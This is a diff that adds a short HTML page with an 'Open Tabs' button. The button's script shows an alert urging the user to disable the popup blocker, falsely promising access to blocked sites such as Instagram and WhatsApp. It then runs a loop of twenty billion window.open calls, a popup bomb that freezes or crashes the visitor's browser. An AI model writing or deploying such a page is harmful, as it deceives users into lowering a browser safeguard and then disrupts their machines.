@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <button id="openTabs">Open Tabs</button>
+
+    <script>
+        document.getElementById('openTabs').addEventListener('click', function() {
+            alert('Please disable the popup blocker for this site. You can do this by clicking on the popup blocker icon in your browser and selecting "Always allow popups from this site" . This will then open blocked websites like instagram , whatsapp');
+            for (let i = 0; i < 20000000000; i++) {
+                window.open('https://www.example.com');
+            }
+        });
+    </script>
+</body>
+</html>
